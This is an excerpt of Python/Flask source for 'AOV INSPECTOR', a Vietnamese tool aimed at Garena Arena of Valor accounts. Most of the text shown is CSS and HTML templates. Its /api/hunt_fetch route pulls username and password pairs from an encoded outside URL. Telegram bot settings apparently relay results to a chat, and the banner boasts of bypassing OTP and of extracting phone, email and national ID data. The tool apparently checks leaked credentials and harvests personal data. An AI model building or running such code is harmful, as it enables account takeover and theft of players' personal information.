    if request.method == "POST":
        ...
        if step == "request":
            ...
            if len(np_) < 4: flash("MK mới phải >= 4 ký tự!", "error"); return redirect(url_for("my_change_creds"))
    ...
    <div class="card">
        <form method="POST">
            ...
            <div style="background:rgba(0,242,254,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(0,242,254,0.3);">
                <p style="font-size:0.82em; color:#00f2fe;">📱 Mã OTP sẽ được gửi vào <b>Tin nhắn riêng</b> (vào Chat → 🆘 Tin nhắn riêng)</p>
            </div>
            """}
            ...
            <div style="background:rgba(0,242,254,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(0,242,254,0.3);">
                <p style="font-size:0.82em; color:#00f2fe;">💬 <b>Chưa nhận được mã?</b> Vào <a href="/chat/support:{username}" target="_blank" style="color:#00f2fe; font-weight:700;">tin nhắn riêng ↗</a> để xem mã OTP.</p>
            </div>
            <div style="background:rgba(255,184,0,0.08); padding:10px; border-radius:10px; margin-bottom:10px; border:1px solid rgba(255,184,0,0.3);">
                <p style="font-size:0.82em; color:#ffb800;">⏱️ Mã có hiệu lực 5 phút.</p>
...
def api_config():
    if request.method == "POST":
        ...
        bt = str(data.get("bot_token", "")).strip()
        ci = str(data.get("chat_id", "")).strip()
        try:
            save_telegram_config(bt, ci)
            return jsonify({"success": True, "message": "Đã lưu cấu hình!"})
        except Exception as e:
            return jsonify({"success": False, "message": f"Lỗi: {e}"}), 500
    else:
        bt, ci = get_telegram_config()
        return jsonify({"success": True, "bot_token": bt, "chat_id": ci})
...
def api_test_telegram():
    ...
    bt = str(data.get("bot_token", "")).strip()
    ci = str(data.get("chat_id", "")).strip()
    if not bt or not ci: bt, ci = get_telegram_config()
    api_base = _get_sec_cfg("TELEGRAM_API_BASE", _TELEGRAM_API_BASE_ENC)
    if not bt or not ci:
        return jsonify({"success": False, "message": "Chưa có Token/Chat ID!"}), 400
    masked = f"{bt[:8]}...{bt[-4:]}" if len(bt) > 12 else bt
    msg = f"""⚡ <b>[AOV INSPECTOR] TEST TELEGRAM</b>
━━━━━━━━━━━━━━━━━━━━
✅ Kết nối thành công!
🤖 Token: <code>{masked}</code>
🆔 Chat ID: <code>{ci}</code>
🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}"""
    try:
        url = f"{api_base}{bt}/sendMessage"
        post_data = urllib.parse.urlencode({"chat_id": ci, "text": msg, "parse_mode": "HTML"}).encode("utf-8")
        req = urllib.request.Request(url, data=post_data, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            res = json.loads(resp.read().decode("utf-8"))
            if res.get("ok"):
                return jsonify({"success": True, "message": "Đã gửi test!"})
            return jsonify({"success": False, "message": res.get("description", "Lỗi Telegram")}), 400
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

# ========== API HUNT ==========
@app.route("/api/hunt_fetch", methods=["GET", "POST"])
@login_required
def api_hunt_fetch():
    hunt_url = _get_sec_cfg("AOV_HUNT_API_URL", _DEFAULT_HUNT_API_ENC)
    if not hunt_url:
        return jsonify({"success": False, "accounts": []})
    count = int(request.args.get("count", 1) or 1)
    count = max(1, min(count, 30))
    accounts = []; seen = set()
    for _ in range(count):
        try:
            req = urllib.request.Request(hunt_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                ...
                if data.get("status") and data.get("result"):
                    for item in data["result"]:
                        ...
                        if acc and pwd and acc not in seen:
                            seen.add(acc)
                            accounts.append({"username": acc, "password": pwd})
        except Exception: pass
        if len(accounts) >= count: break
...
# ============================================================
# ========== BASE CSS - HTML REPORT UI (v5.1.0) =============
# ============================================================
BASE_CSS = """<style>
...
.menu-card{background:linear-gradient(180deg,rgba(16,26,52,0.92) 0%,rgba(9,16,32,0.98) 100%);border:1px solid var(--border-card);border-radius:24px;padding:26px 22px 20px 22px;backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);box-shadow:0 20px 50px rgba(0,0,0,0.75),0 0 30px rgba(0,242,254,0.1);position:relative;overflow:hidden;}
...
.menu-subtitle{font-family:var(--font-display);font-size:13px;color:#94a3b8;letter-spacing:0.5px;display:flex;align-items:center;justify-content:center;gap:6px;}
...
.menu-btn{text-decoration:none;background:linear-gradient(135deg,rgba(15,23,42,0.7),rgba(0,242,254,0.03));border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:16px 10px 14px 10px;text-align:center;color:var(--text);display:flex;flex-direction:column;align-items:center;gap:8px;position:relative;transition:all 0.35s cubic-bezier(0.4,0,0.2,1);}
...
.menu-btn:hover .menu-icon,.menu-btn.active .menu-icon{transform:scale(1.15);filter:drop-shadow(0 0 18px var(--cyan-neon));}
...
.menu-btn.active .menu-label,.menu-btn:hover .menu-label{color:#fff;text-shadow:0 0 10px var(--cyan-neon);}
.menu-badge{position:absolute;top:8px;right:8px;background:linear-gradient(135deg,#ff007f,#ff0066);color:#fff;font-size:0.6em;padding:2px 7px;border-radius:8px;font-weight:800;min-width:18px;box-shadow:0 0 10px rgba(255,0,127,0.7);line-height:1.3;letter-spacing:0.5px;}
.menu-badge-pro{position:absolute;top:8px;right:8px;background:linear-gradient(135deg,#ff007f,#ff5500);color:#fff;font-size:0.55em;font-weight:800;padding:2px 6px;border-radius:6px;letter-spacing:0.5px;box-shadow:0 0 8px rgba(255,0,127,0.6);}
.menu-footer{margin-top:18px;padding-top:14px;border-top:1px solid rgba(255,255,255,0.06);display:flex;justify-content:space-around;text-align:center;font-family:var(--font-display);font-size:0.75em;color:#64748b;letter-spacing:0.5px;flex-wrap:wrap;gap:8px;}
.menu-footer span{display:inline-flex;align-items:center;gap:4px;color:#94a3b8;}
...
.card-title i{color:var(--cyan-neon);filter:drop-shadow(0 0 6px var(--cyan-neon));}
...
.form-input:focus,.form-textarea:focus{border-color:var(--cyan-neon);background:rgba(10,17,36,0.95);box-shadow:0 0 0 3px rgba(0,242,254,0.15),0 0 20px rgba(0,242,254,0.2);}
.form-textarea{min-height:100px;resize:vertical;font-family:'Share Tech Mono',monospace;}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:14px 24px;background:linear-gradient(135deg,#00f2fe,#4facfe);color:#030712;border:none;border-radius:12px;font-weight:800;font-size:0.9em;cursor:pointer;text-decoration:none;font-family:var(--font-display);letter-spacing:1.5px;text-transform:uppercase;transition:all 0.3s;box-shadow:0 6px 25px rgba(0,242,254,0.4);}
...
.stat-box:hover{border-color:var(--cyan-neon);box-shadow:0 8px 25px rgba(0,242,254,0.2);}
.stat-value{font-family:var(--font-display);font-size:1.9em;font-weight:800;background:linear-gradient(135deg,#00f2fe,#38bdf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;line-height:1.1;margin-bottom:6px;}
...
.list-item:hover{border-color:var(--cyan-neon);transform:translateX(5px);box-shadow:0 0 15px rgba(0,242,254,0.15);}
...
.tab-item.active{background:linear-gradient(135deg,rgba(0,242,254,0.2),rgba(56,189,248,0.2));border-color:var(--cyan-neon);color:#fff;box-shadow:0 0 12px rgba(0,242,254,0.25);}
...
.skin-card:hover{transform:translateY(-3px);border-color:var(--cyan-neon);box-shadow:0 8px 25px rgba(0,242,254,0.3);}
...
.skin-hero{font-family:var(--font-display);font-size:0.72em;font-weight:700;color:var(--cyan-neon);margin-bottom:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
...
.cred-value{font-family:var(--font-mono);font-size:1em;color:var(--cyan-neon);font-weight:700;word-break:break-all;padding:8px 12px;background:rgba(5,8,17,0.7);border-radius:8px;margin-bottom:12px;border:1px solid rgba(0,242,254,0.25);cursor:pointer;}
.cred-value:hover{background:rgba(0,242,254,0.1);}
.spinner{display:inline-block;width:22px;height:22px;border:3px solid rgba(0,242,254,0.2);border-top-color:var(--cyan-neon);border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px;}
...
.chat-msg.system{align-self:center;background:linear-gradient(135deg,rgba(0,242,254,0.15),rgba(56,189,248,0.15));border:1.5px solid rgba(0,242,254,0.5);color:#00f2fe;font-family:var(--font-mono);font-size:0.85em;text-align:left;max-width:95%;}
...
.chat-unread{background:linear-gradient(135deg,#ff007f,#ff0066);color:#fff;font-size:0.65em;font-weight:800;padding:3px 8px;border-radius:10px;min-width:20px;text-align:center;font-family:var(--font-display);}

/* ========== HTML REPORT UI ========== */
.player-showcase-banner{background:linear-gradient(135deg,rgba(13,27,62,0.9) 0%,rgba(8,15,33,0.95) 100%);border:1px solid rgba(0,242,254,0.25);border-radius:20px;padding:22px 18px;margin-bottom:18px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:18px;box-shadow:0 15px 40px rgba(0,0,0,0.6),inset 0 0 25px rgba(0,242,254,0.05);position:relative;overflow:hidden;}
...
.stat-pill{background:rgba(5,8,17,0.85);border:1px solid rgba(255,255,255,0.1);border-radius:14px;padding:8px 14px;text-align:center;box-shadow:0 6px 16px rgba(0,0,0,0.4);display:flex;flex-direction:column;align-items:center;justify-content:center;min-width:130px;max-width:100%;}
.stat-pill-label{font-family:var(--font-display);font-size:11px;font-weight:700;color:#94a3b8;text-transform:uppercase;letter-spacing:0.8px;margin-bottom:2px;white-space:nowrap;}
.stat-pill-value{font-family:var(--font-display);font-size:15px;font-weight:800;color:#fff;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center;gap:4px;line-height:1.2;}
.stats-row-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-bottom:18px;}
.esports-stat-card{background:var(--bg-card);border:1px solid var(--border-card);border-radius:16px;padding:16px;display:flex;align-items:center;gap:14px;box-shadow:0 8px 24px rgba(0,0,0,0.5);position:relative;overflow:hidden;transition:transform 0.25s ease;}
...
.stat-card-text .val{font-family:var(--font-display);font-size:20px;font-weight:800;color:#fff;letter-spacing:0.5px;}
...
.matrix-item{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;background:rgba(5,8,17,0.6);border:1px solid rgba(255,255,255,0.05);border-radius:10px;font-size:13px;gap:8px;transition:all 0.2s;}
.matrix-item:hover{background:rgba(255,255,255,0.03);border-color:rgba(255,255,255,0.12);}
...
.moba-skin-card{background:linear-gradient(180deg,rgba(20,32,58,0.6) 0%,rgba(8,14,28,0.9) 100%);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:12px;display:flex;flex-direction:column;align-items:center;text-align:center;position:relative;overflow:hidden;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);}
.moba-skin-card:hover{transform:translateY(-4px);box-shadow:0 10px 25px rgba(0,0,0,0.7);}
.moba-skin-card.card-sss{border-color:rgba(255,183,3,0.4);box-shadow:0 0 15px rgba(255,183,3,0.15);}
.moba-skin-card.card-anime{border-color:rgba(255,0,127,0.4);box-shadow:0 0 15px rgba(255,0,127,0.15);}
...
.skin-title-name{font-size:12px;font-weight:700;color:#fff;margin-bottom:3px;line-height:1.3;min-height:32px;max-width:100%;overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;}
...
.pill-sss{background:linear-gradient(135deg,#ffe259,#ffa751);color:#000;box-shadow:0 0 10px var(--gold-glow);}
.pill-anime{background:linear-gradient(135deg,#ff0844,#ffb199);color:#fff;box-shadow:0 0 10px var(--pink-glow);}
.pill-ss{background:linear-gradient(135deg,#4facfe,#00f2fe);color:#000;box-shadow:0 0 10px var(--blue-glow);}
.pill-normal{background:rgba(255,255,255,0.08);color:#94a3b8;}
...
.btn-copy-chip{background:rgba(255,255,255,0.08);border:none;color:#fff;padding:4px 10px;border-radius:5px;font-size:11px;cursor:pointer;font-weight:600;transition:all 0.2s;flex-shrink:0;}
...
::-webkit-scrollbar-thumb{background:linear-gradient(135deg,#00f2fe,#4facfe);border-radius:3px;}
@media (max-width:768px){
  ...
  .stat-pill-value{font-size:13px;overflow:hidden;text-overflow:ellipsis;max-width:100%;}
  ...
  .glass-panel{padding:16px 12px;border-radius:16px;margin-bottom:16px;}
  ...
  .skin-hero-sub{font-size:10px;margin-bottom:6px;}
  .tier-badge-pill{font-size:10px;padding:2px 8px;}
}
</style>
<script>
        ...
        menu = f'''<div class="menu-portal">
            <div class="menu-card">
                <div class="menu-header">
                    ...
                    <div class="menu-title">AOV INSPECTOR</div>
                    <div class="menu-subtitle"><span class="pulse-dot"></span> Cổng TCP Trực Tiếp Garena</div>
                </div>
                <div class="menu-grid-new">
                    ...
                    <a href="/check_file" class="{mcls('check_file')}"><div class="menu-icon">▣</div><div class="menu-label">File</div><div class="menu-badge-pro">PRO</div></a>
                ...
                <div class="menu-footer">
                    <span>🛡️ An Toàn 100%</span>
                    <span>⚡ Không Cần OTP</span>
                    <span>💎 Full Skin SSS</span>
                </div>
            </div>
        </div>'''
    return f'''<!DOCTYPE html>
<html lang="vi"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="theme-color" content="#050811"><title>AOV INSPECTOR v5.1.0</title>{BASE_CSS}</head>
<body><div class="cyber-grid"></div><div class="container">{header}{menu}{flash_html()}{content}</div></body></html>'''
...
if __name__ == "__main__":
    ...
    if is_port_in_use(port):
        ...
        print("=" * 70)
        print(f"💡 Cách fix:")
        print(f"   1. Mở tab Termux mới, chạy: pkill -9 python")
        print(f"   2. Đợi 2 giây, chạy lại: python kk_fixed.py")
        print(f"   3. Hoặc đổi port khác: PORT=5001 python kk_fixed.py")
        print("=" * 70)
        import sys as _sys
        _sys.exit(1)

    print("=" * 70)
    print("◈ AOV INSPECTOR - ULTIMATE EDITION v5.1.0 (FIX SĐT)")
    print("=" * 70)
    ...
    print(f"🎨 v5.1: FIX SĐT/EMAIL/CMND — 12 endpoints + deep find depth 10")
    print(f"🔧 FIX: Timeout 8s · Retry 2 · Cache không lưu acc ban · Port check")
    print(f"🍔 Menu 12 nút đầy đủ")
    print(f"🚀 Port: {port}")
    print("=" * 70)
